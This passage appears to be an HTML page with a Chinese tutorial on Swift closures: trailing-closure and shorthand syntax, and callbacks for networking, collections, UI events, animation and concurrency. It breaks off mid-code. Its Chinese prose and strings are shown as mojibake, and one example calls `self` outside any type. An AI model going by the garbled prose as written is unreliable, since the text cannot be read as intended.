<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">executeClosure</span>(<span class="hljs-params">closure</span>: () -&gt; <span class="hljs-type">Void</span>) {
    closure()
}

executeClosure {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒ¿åå‡½æ•°"</span>)
}
</code></pre>
<h3 data-id="heading-9">å…³é”®æ¦‚å¿µ</h3>
<ul>
<li><strong>é—­åŒ…</strong>ï¼šå¯ä»¥æ•è·å’Œå­˜å‚¨å…¶æ‰€åœ¨ä¸Šä¸‹æ–‡ä¸­å˜é‡å’Œå¸¸é‡çš„å¼•ç”¨</li>
<li><strong>åŒ¿åå‡½æ•°</strong>ï¼šæ²¡æœ‰åå­—çš„å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥èµ‹å€¼ç»™å˜é‡æˆ–ä½œä¸ºå‚æ•°ä¼ é€’</li>
<li><strong>ç±»å‹æ¨æ–­</strong>ï¼šSwiftå¯ä»¥æ ¹æ®ä¸Šä¸‹æ–‡è‡ªåŠ¨æ¨æ–­é—­åŒ…çš„ç±»å‹</li>
</ul>
<h3 data-id="heading-10">æ‰§è¡Œç»“æœ</h3>
<p>æ‰§è¡Œè¿™æ®µä»£ç ä¼šè¾“å‡ºï¼š<code>åŒ¿åå‡½æ•°</code></p>
<h3 data-id="heading-11">é—­åŒ…çš„ç‰¹ç‚¹</h3>
<ol>
<li><strong>å¯ä»¥æ•è·ä¸Šä¸‹æ–‡</strong>ï¼šé—­åŒ…å¯ä»¥æ•è·å’Œå­˜å‚¨å…¶æ‰€åœ¨ä½œç”¨åŸŸä¸­çš„å˜é‡å’Œå¸¸é‡</li>
<li><strong>å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’</strong>ï¼šå¯ä»¥ä½œä¸ºå‡½æ•°çš„å‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°</li>
<li><strong>å¯ä»¥ä½œä¸ºè¿”å›å€¼</strong>ï¼šå‡½æ•°å¯ä»¥è¿”å›é—­åŒ…ä½œä¸ºè¿”å›å€¼</li>
<li><strong>æœ‰ä¸‰ç§å½¢å¼</strong>ï¼š
<ul>
<li>å…¨å±€å‡½æ•°ï¼šæœ‰åå­—ä½†ä¸èƒ½æ•è·å€¼</li>
<li>åµŒå¥—å‡½æ•°ï¼šæœ‰åå­—ä¸”èƒ½æ•è·å…¶å°é—­å‡½æ•°åŸŸå†…çš„å€¼</li>
<li>é—­åŒ…è¡¨è¾¾å¼ï¼šæ— åå­—çš„è½»é‡çº§è¯­æ³•ï¼Œèƒ½æ•è·å…¶ä¸Šä¸‹æ–‡ä¸­å˜é‡æˆ–å¸¸é‡çš„å€¼</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">å‘½åå‡½æ•° vs é—­åŒ…è¡¨è¾¾å¼çš„åŒºåˆ«</h3>
<h4 data-id="heading-13">ç¤ºä¾‹ä»£ç å¯¹æ¯”</h4>
<h5 data-id="heading-14">ç¬¬ä¸€ç§å†™æ³•ï¼šå‘½åå‡½æ•°èµ‹å€¼</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">test3</span>(<span class="hljs-params">param</span>:[<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">String</span>
{
    <span class="hljs-keyword">var</span> temp:<span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> param {
        temp <span class="hljs-operator">=</span> temp <span class="hljs-operator">+</span> <span class="hljs-type">String</span>(item)
    }
    <span class="hljs-keyword">return</span> temp
}
<span class="hljs-keyword">var</span> e:([<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">String</span> <span class="hljs-operator">=</span> test3
<span class="hljs-built_in">print</span>(e([<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]))  <span class="hljs-comment">// è¾“å‡ºï¼š23</span>
</code></pre>
<h5 data-id="heading-15">ç¬¬äºŒç§å†™æ³•ï¼šé—­åŒ…è¡¨è¾¾å¼</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">var</span> f:([<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">String</span> <span class="hljs-operator">=</span> {
    (a:[<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">String</span> <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">var</span> temp:<span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> a {
        temp <span class="hljs-operator">=</span> temp <span class="hljs-operator">+</span> <span class="hljs-type">String</span>(item)
    }
    <span class="hljs-keyword">return</span> temp
}
<span class="hljs-built_in">print</span>(f([<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]))  <span class="hljs-comment">// è¾“å‡ºï¼š456</span>
</code></pre>
<h4 data-id="heading-16">æ ¸å¿ƒåŒºåˆ«</h4>
<h5 data-id="heading-17">1. <strong>å®šä¹‰æ–¹å¼</strong></h5>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šä½¿ç”¨ <code>func</code> å…³é”®å­—å®šä¹‰ï¼Œæœ‰å‡½æ•°åï¼Œå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹é‡å¤è°ƒç”¨</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šç›´æ¥åœ¨èµ‹å€¼æ—¶å®šä¹‰ï¼Œæ²¡æœ‰å‡½æ•°åï¼Œæ˜¯ä¸€æ¬¡æ€§ä½¿ç”¨çš„åŒ¿åå‡½æ•°</li>
</ul>
<h5 data-id="heading-18">2. <strong>ä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸ</strong></h5>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šæœ‰ç‹¬ç«‹çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¯ä»¥åœ¨å®šä¹‰åå¤šæ¬¡è°ƒç”¨</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šèµ‹å€¼ç»™å˜é‡åï¼Œé€šè¿‡å˜é‡åè°ƒç”¨ï¼Œå˜é‡çš„ç”Ÿå‘½å‘¨æœŸå†³å®šäº†é—­åŒ…çš„ç”Ÿå‘½å‘¨æœŸ</li>
</ul>
<h5 data-id="heading-19">3. <strong>å†…å­˜å ç”¨</strong></h5>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šå‡½æ•°æœ¬èº«å ç”¨å†…å­˜ï¼Œä½†èµ‹å€¼ç»™å˜é‡æ—¶åªæ˜¯å¼•ç”¨ä¼ é€’</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šé—­åŒ…æœ¬èº«å’Œæ•è·çš„ä¸Šä¸‹æ–‡éƒ½ä¼šå ç”¨å†…å­˜</li>
</ul>
<h5 data-id="heading-20">4. <strong>ä½¿ç”¨åœºæ™¯</strong></h5>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šé€‚ç”¨äºéœ€è¦é‡ç”¨çš„é€»è¾‘ï¼Œå‡½æ•°ä½“å¤æ‚ï¼ŒåŠŸèƒ½ç‹¬ç«‹çš„æƒ…å†µ</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šé€‚ç”¨äºç®€å•çš„å›è°ƒé€»è¾‘ï¼Œä½œä¸ºå‚æ•°ä¼ é€’ï¼Œæˆ–éœ€è¦æ•è·ä¸Šä¸‹æ–‡çš„åœºæ™¯</li>
</ul>
<h5 data-id="heading-21">5. <strong>è¯­æ³•ç‰¹ç‚¹</strong></h5>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šæœ‰ç‹¬ç«‹çš„å‡½æ•°ç­¾åï¼Œå¯ä»¥æœ‰é»˜è®¤å‚æ•°ç­‰</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šè¯­æ³•æ›´ç®€æ´ï¼Œå¯ä»¥çœç•¥ç±»å‹æ ‡æ³¨ï¼ˆç±»å‹æ¨æ–­ï¼‰</li>
</ul>
<h4 data-id="heading-22">å®é™…åº”ç”¨åœºæ™¯</h4>
<p>é—­åŒ…åœ¨Swiftå¼€å‘ä¸­éå¸¸å¸¸ç”¨ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å¼‚æ­¥å›è°ƒ</li>
<li>é›†åˆç±»å‹çš„æ“ä½œï¼ˆå¦‚mapã€filterã€sortï¼‰</li>
<li>UIäº‹ä»¶å¤„ç†</li>
<li>å®šæ—¶å™¨å›è°ƒ</li>
<li>ç½‘ç»œè¯·æ±‚å›è°ƒ</li>
</ul>
<h4 data-id="heading-23">æ€§èƒ½è€ƒè™‘</h4>
<ul>
<li><strong>å‘½åå‡½æ•°</strong>ï¼šé€šå¸¸æ€§èƒ½æ›´å¥½ï¼Œå› ä¸ºæ²¡æœ‰é¢å¤–çš„ä¸Šä¸‹æ–‡æ•è·å¼€é”€</li>
<li><strong>é—­åŒ…è¡¨è¾¾å¼</strong>ï¼šå¦‚æœæ•è·äº†å¤§é‡ä¸Šä¸‹æ–‡å˜é‡ï¼Œå¯èƒ½äº§ç”Ÿå¾ªç¯å¼•ç”¨æˆ–å†…å­˜æ³„æ¼é£é™©</li>
</ul>
<h4 data-id="heading-24">æœ€ä½³å®è·µ</h4>
<ol>
<li>
<p><strong>ä½¿ç”¨å‘½åå‡½æ•°</strong>å½“ï¼š</p>
<ul>
<li>å‡½æ•°é€»è¾‘å¤æ‚ä¸”éœ€è¦é‡ç”¨</li>
<li>å‡½æ•°éœ€è¦æœ‰æ˜ç¡®çš„åç§°ä¾¿äºè°ƒè¯•</li>
<li>ä¸éœ€è¦æ•è·å¤–éƒ¨ä¸Šä¸‹æ–‡</li>
</ul>
</li>
<li>
<p><strong>ä½¿ç”¨é—­åŒ…è¡¨è¾¾å¼</strong>å½“ï¼š</p>
<ul>
<li>éœ€è¦ç®€å•çš„å›è°ƒé€»è¾‘</li>
<li>ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°</li>
<li>éœ€è¦æ•è·å’Œä¿®æ”¹å¤–éƒ¨å˜é‡</li>
<li>ç”¨äºå†…è”å®šä¹‰ï¼Œæé«˜ä»£ç å¯è¯»æ€§</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">é—­åŒ…ä½œä¸ºå‡½æ•°å‚æ•°çš„è¿›é˜¶ç”¨æ³•</h3>
<h4 data-id="heading-26">ç¤ºä¾‹ä»£ç åˆ†æ</h4>
<h5 data-id="heading-27">1. æ— å‚æ•°é—­åŒ…</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">param</span>:() -&gt; <span class="hljs-type">Void</span>)
{
    param()
}

<span class="hljs-comment">// è°ƒç”¨æ–¹å¼ï¼šå°¾éšé—­åŒ…è¯­æ³•</span>
test{
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"test"</span>)
}
</code></pre>
<p><strong>åˆ†æ</strong>ï¼š</p>
<ul>
<li><code>test</code>å‡½æ•°æ¥å—ä¸€ä¸ª<code>() -&gt; Void</code>ç±»å‹çš„é—­åŒ…å‚æ•°</li>
<li>ä½¿ç”¨å°¾éšé—­åŒ…è¯­æ³•è°ƒç”¨ï¼š<code>test{ print("test") }</code></li>
<li>çœç•¥äº†<code>param:</code>æ ‡ç­¾ï¼Œç›´æ¥åœ¨å¤§æ‹¬å·ä¸­å®šä¹‰é—­åŒ…</li>
</ul>
<h5 data-id="heading-28">2. å•å‚æ•°é—­åŒ…</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">test2</span>(<span class="hljs-params">param</span>:(<span class="hljs-type">Int</span>)-&gt; <span class="hljs-type">Void</span>)
{
    param(<span class="hljs-number">10</span>)
}

<span class="hljs-comment">// å®Œæ•´å†™æ³•</span>
test2(param: {(value:<span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Void</span> <span class="hljs-keyword">in</span>
    <span class="hljs-built_in">print</span>(value)
})

<span class="hljs-comment">// ç®€åŒ–å†™æ³•ï¼ˆå°¾éšé—­åŒ…ï¼‰</span>
test2{ (value) <span class="hljs-keyword">in</span>
    <span class="hljs-built_in">print</span>(value)
}
</code></pre>
<p><strong>åˆ†æ</strong>ï¼š</p>
<ul>
<li><code>test2</code>å‡½æ•°æ¥å—<code>(Int) -&gt; Void</code>ç±»å‹çš„é—­åŒ…</li>
<li>å®Œæ•´å†™æ³•ï¼šæ˜ç¡®æŒ‡å®šå‚æ•°ç±»å‹å’Œè¿”å›ç±»å‹</li>
<li>ç®€åŒ–å†™æ³•ï¼šçœç•¥å‚æ•°ç±»å‹ï¼ˆç±»å‹æ¨æ–­ï¼‰ï¼Œä½¿ç”¨å°¾éšé—­åŒ…è¯­æ³•</li>
</ul>
<h5 data-id="heading-29">3. å¤šå‚æ•°æœ‰è¿”å›å€¼é—­åŒ…</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">test3</span>(<span class="hljs-params">param</span>:(<span class="hljs-type">Int</span>, <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span>)
{
    <span class="hljs-built_in">print</span>(param(<span class="hljs-number">10</span>,<span class="hljs-number">30</span>))
}

<span class="hljs-comment">// å®Œæ•´å†™æ³•</span>
test3(param:{(item1, item2) -&gt; <span class="hljs-type">Int</span> <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">return</span> item1 <span class="hljs-operator">+</span> item2
})

<span class="hljs-comment">// æç®€å†™æ³•</span>
test3(param:{
    <span class="hljs-variable">$0</span> <span class="hljs-operator">+</span> <span class="hljs-variable">$1</span>  <span class="hljs-comment">// ä½¿ç”¨$0ã€$1è¡¨ç¤ºç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°</span>
})
</code></pre>
<p><strong>åˆ†æ</strong>ï¼š</p>
<ul>
<li><code>test3</code>å‡½æ•°æ¥å—<code>(Int, Int) -&gt; Int</code>ç±»å‹çš„é—­åŒ…</li>
<li>å®Œæ•´å†™æ³•ï¼šæ˜ç¡®å‚æ•°åå’Œè¿”å›ç±»å‹</li>
<li>æç®€å†™æ³•ï¼šä½¿ç”¨<code>$0</code>ã€<code>$1</code>ç­‰ç®€å†™å‚æ•°åï¼Œçœç•¥<code>return</code>å’Œ<code>in</code></li>
</ul>
<h4 data-id="heading-30">è®°å¿†è¦ç‚¹</h4>
<h5 data-id="heading-31">é—­åŒ…è¯­æ³•ç®€åŒ–è§„åˆ™ï¼š</h5>
<ol>
<li><strong>å‚æ•°ç±»å‹çœç•¥</strong>ï¼šå¦‚æœèƒ½ä»ä¸Šä¸‹æ–‡æ¨æ–­ï¼Œå¯ä»¥çœç•¥å‚æ•°ç±»å‹</li>
<li><strong>è¿”å›ç±»å‹çœç•¥</strong>ï¼šå•è¡¨è¾¾å¼é—­åŒ…å¯ä»¥çœç•¥<code>return</code></li>
<li><strong>å‚æ•°åç®€åŒ–</strong>ï¼šå¯ä»¥ä½¿ç”¨<code>$0</code>ã€<code>$1</code>ç­‰ä»£æ›¿å‚æ•°å</li>
<li><strong>åœ†æ‹¬å·çœç•¥</strong>ï¼šå•å‚æ•°æ—¶å¯ä»¥çœç•¥å‚æ•°åœ†æ‹¬å·</li>
</ol>
<h5 data-id="heading-32">å°¾éšé—­åŒ…è¯­æ³•è§„åˆ™ï¼š</h5>
<ul>
<li>å½“é—­åŒ…æ˜¯å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å°¾éšé—­åŒ…è¯­æ³•</li>
<li>çœç•¥å‚æ•°æ ‡ç­¾ï¼Œç›´æ¥åœ¨å¤§æ‹¬å·ä¸­å®šä¹‰é—­åŒ…</li>
<li>ä½¿ä»£ç æ›´ç®€æ´æ˜“è¯»</li>
</ul>
<h4 data-id="heading-33">å®é™…è¿è¡Œç»“æœ</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// test{ print("test") } è¾“å‡ºï¼štest</span>

<span class="hljs-comment">// test2{ (value) in print(value) } è¾“å‡ºï¼š10</span>

<span class="hljs-comment">// test3{ $0 + $1 } ä¼ å…¥(10,30) è¾“å‡ºï¼š40</span>
</code></pre>
<h4 data-id="heading-34">å¸¸è§åº”ç”¨åœºæ™¯è¯¦è§£</h4>
<h5 data-id="heading-35">1. <strong>ç½‘ç»œè¯·æ±‚å¼‚æ­¥å›è°ƒ</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚å‡½æ•°</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">userId</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">User</span>?, <span class="hljs-type">Error</span>?) -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-type">DispatchQueue</span>.global().async {
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
        <span class="hljs-type">Thread</span>.sleep(forTimeInterval: <span class="hljs-number">1.0</span>)

        <span class="hljs-comment">// æ¨¡æ‹ŸæˆåŠŸè·å–ç”¨æˆ·æ•°æ®</span>
        <span class="hljs-keyword">let</span> user <span class="hljs-operator">=</span> <span class="hljs-type">User</span>(name: <span class="hljs-string">"å¼ ä¸‰"</span>, age: <span class="hljs-number">25</span>)
        <span class="hljs-type">DispatchQueue</span>.main.async {
            completion(user, <span class="hljs-literal">nil</span>)
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
fetchUserData(userId: <span class="hljs-string">"123"</span>) { user, error <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> user <span class="hljs-operator">=</span> user {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è·å–ç”¨æˆ·æˆåŠŸï¼š<span class="hljs-subst">\(user.name)</span>, å¹´é¾„ï¼š<span class="hljs-subst">\(user.age)</span>"</span>)
        <span class="hljs-comment">// åœ¨ä¸»çº¿ç¨‹æ›´æ–°UI</span>
        <span class="hljs-keyword">self</span>.updateUI(with: user)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> error {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è·å–ç”¨æˆ·å¤±è´¥ï¼š<span class="hljs-subst">\(error.localizedDescription)</span>"</span>)
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šiOSå¼€å‘ä¸­æ‰€æœ‰ç½‘ç»œè¯·æ±‚å‡ ä¹éƒ½ä½¿ç”¨é—­åŒ…å›è°ƒï¼Œå¦‚URLSessionã€Alamofireç­‰ã€‚</p>
<h5 data-id="heading-36">2. <strong>æ•°ç»„å’Œé›†åˆæ“ä½œ</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> numbers <span class="hljs-operator">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]

<span class="hljs-comment">// mapï¼šè½¬æ¢æ¯ä¸ªå…ƒç´ </span>
<span class="hljs-keyword">let</span> doubled <span class="hljs-operator">=</span> numbers.map { <span class="hljs-variable">$0</span> <span class="hljs-operator">*</span> <span class="hljs-number">2</span> }  <span class="hljs-comment">// [2, 4, 6, 8, 10, 12, 14, 16, 18, 20]</span>

<span class="hljs-comment">// filterï¼šè¿‡æ»¤å…ƒç´ </span>
<span class="hljs-keyword">let</span> evenNumbers <span class="hljs-operator">=</span> numbers.filter { <span class="hljs-variable">$0</span> <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> }  <span class="hljs-comment">// [2, 4, 6, 8, 10]</span>

<span class="hljs-comment">// reduceï¼šç´¯ç§¯è®¡ç®—</span>
<span class="hljs-keyword">let</span> sum <span class="hljs-operator">=</span> numbers.reduce(<span class="hljs-number">0</span>) { <span class="hljs-variable">$0</span> <span class="hljs-operator">+</span> <span class="hljs-variable">$1</span> }  <span class="hljs-comment">// 55</span>

<span class="hljs-comment">// sortï¼šæ’åº</span>
<span class="hljs-keyword">let</span> sorted <span class="hljs-operator">=</span> numbers.sorted { <span class="hljs-variable">$0</span> <span class="hljs-operator">&gt;</span> <span class="hljs-variable">$1</span> }  <span class="hljs-comment">// [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]</span>

<span class="hljs-comment">// é“¾å¼è°ƒç”¨</span>
<span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> numbers
    .filter { <span class="hljs-variable">$0</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> }
    .map { <span class="hljs-variable">$0</span> <span class="hljs-operator">*</span> <span class="hljs-variable">$0</span> }
    .reduce(<span class="hljs-number">0</span>, <span class="hljs-operator">+</span>)  <span class="hljs-comment">// å¹³æ–¹å’Œï¼š36+49+64+81+100=330</span>
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šå¤„ç†æ•°æ®è½¬æ¢ã€è¿‡æ»¤ã€ç»Ÿè®¡ç­‰æ“ä½œã€‚</p>
<h5 data-id="heading-37">3. <strong>UIäº‹ä»¶å¤„ç†</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> UIKit

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span>: <span class="hljs-title class_">UIViewController</span> {

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">viewDidLoad</span>() {
        <span class="hljs-keyword">super</span>.viewDidLoad()

        <span class="hljs-comment">// UIButtonç‚¹å‡»äº‹ä»¶</span>
        <span class="hljs-keyword">let</span> button <span class="hljs-operator">=</span> <span class="hljs-type">UIButton</span>(type: .system)
        button.setTitle(<span class="hljs-string">"ç‚¹å‡»æˆ‘"</span>, for: .normal)
        button.addAction(<span class="hljs-type">UIAction</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.handleButtonTap()
        }, for: .touchUpInside)

        <span class="hljs-comment">// UITextFieldæ–‡æœ¬å˜åŒ–ç›‘å¬</span>
        <span class="hljs-keyword">let</span> textField <span class="hljs-operator">=</span> <span class="hljs-type">UITextField</span>()
        textField.addAction(<span class="hljs-type">UIAction</span> { <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ–‡æœ¬å˜åŒ–ï¼š<span class="hljs-subst">\(textField.text <span class="hljs-operator">??</span> <span class="hljs-string">""</span>)</span>"</span>)
        }, for: .editingChanged)

        <span class="hljs-comment">// å®šæ—¶å™¨</span>
        <span class="hljs-type">Timer</span>.scheduledTimer(withTimeInterval: <span class="hljs-number">1.0</span>, repeats: <span class="hljs-literal">true</span>) { timer <span class="hljs-keyword">in</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®šæ—¶å™¨è§¦å‘"</span>)
        }
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">handleButtonTap</span>() {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼"</span>)
        <span class="hljs-comment">// å¤„ç†ç‚¹å‡»é€»è¾‘</span>
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šæ‰€æœ‰UIæ§ä»¶çš„äº‹ä»¶å“åº”éƒ½ä½¿ç”¨é—­åŒ…ã€‚</p>
<h5 data-id="heading-38">4. <strong>åŠ¨ç”»å’Œè¿‡æ¸¡æ•ˆæœ</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> UIKit

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnimationViewController</span>: <span class="hljs-title class_">UIViewController</span> {

    <span class="hljs-keyword">let</span> animatedView <span class="hljs-operator">=</span> <span class="hljs-type">UIView</span>()

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">viewDidLoad</span>() {
        <span class="hljs-keyword">super</span>.viewDidLoad()

        <span class="hljs-comment">// UIViewåŠ¨ç”»</span>
        <span class="hljs-type">UIView</span>.animate(withDuration: <span class="hljs-number">0.5</span>) {
            <span class="hljs-keyword">self</span>.animatedView.alpha <span class="hljs-operator">=</span> <span class="hljs-number">0.5</span>
            <span class="hljs-keyword">self</span>.animatedView.transform <span class="hljs-operator">=</span> <span class="hljs-type">CGAffineTransform</span>(scaleX: <span class="hljs-number">1.2</span>, y: <span class="hljs-number">1.2</span>)
        } completion: { finished <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">if</span> finished {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ¨ç”»å®Œæˆ"</span>)
                <span class="hljs-comment">// æ‰§è¡Œåç»­æ“ä½œ</span>
            }
        }

        <span class="hljs-comment">// UIViewPropertyAnimator</span>
        <span class="hljs-keyword">let</span> animator <span class="hljs-operator">=</span> <span class="hljs-type">UIViewPropertyAnimator</span>(duration: <span class="hljs-number">1.0</span>, curve: .easeInOut) {
            <span class="hljs-keyword">self</span>.animatedView.center <span class="hljs-operator">=</span> <span class="hljs-type">CGPoint</span>(x: <span class="hljs-number">200</span>, y: <span class="hljs-number">300</span>)
        }

        animator.addCompletion { position <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">switch</span> position {
            <span class="hljs-keyword">case</span> .end:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ¨ç”»æ­£å¸¸ç»“æŸ"</span>)
            <span class="hljs-keyword">case</span> .current:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ¨ç”»è¢«ä¸­æ–­"</span>)
            <span class="hljs-keyword">case</span> .start:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ¨ç”»å¼€å§‹"</span>)
            <span class="hljs-keyword">@unknown</span> <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">break</span>
            }
        }

        animator.startAnimation()
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šæ‰€æœ‰iOSåŠ¨ç”»æ•ˆæœéƒ½ä¾èµ–é—­åŒ…ã€‚</p>
<h5 data-id="heading-39">5. <strong>å¤šçº¿ç¨‹å’Œå¹¶å‘</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> Foundation

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataManager</span> {

    <span class="hljs-comment">// å¼‚æ­¥æ•°æ®å¤„ç†</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processDataAsync</span>(<span class="hljs-params">data</span>: [<span class="hljs-type">Int</span>], <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> ([<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-type">DispatchQueue</span>.global(qos: .userInitiated).async {
            <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
            <span class="hljs-keyword">let</span> processedData <span class="hljs-operator">=</span> data.map { <span class="hljs-variable">$0</span> <span class="hljs-operator">*</span> <span class="hljs-variable">$0</span> }

            <span class="hljs-comment">// å›åˆ°ä¸»çº¿ç¨‹å›è°ƒ</span>
            <span class="hljs-type">DispatchQueue</span>.main.async {
                completion(processedData)
            }
        }
    }

    <span class="hljs-comment">// å¹¶è¡Œå¤„ç†</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processInParallel</span>(<span class="hljs-params">data</span>: [<span class="hljs-type">Int</span>], <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> ([<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
        <span class="hljs-keyword">var</span> results <span class="hljs-operator">=</span> [<span class="hljs-type">Int</span>]()
        <span class="hljs-keyword">let</span> lock <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.example.lock"</span>)

        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data {
            group.enter()
            <span class="hljs-type">DispatchQueue</span>.global().async {
                <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶è®¡ç®—</span>
                <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> item <span class="hljs-operator">*</span> item <span class="hljs-operator">*</span> item
                lock.sync {
                    results.append(result)
                }
                group.leave()
            }
        }

        group.notify(queue: .main) {
            completion(results.sorted())
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">let</span> manager <span class="hljs-operator">=</span> <span class="hljs-type">DataManager</span>()
manager.processDataAsync(data: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]) { results <span class="hljs-keyword">in</span>
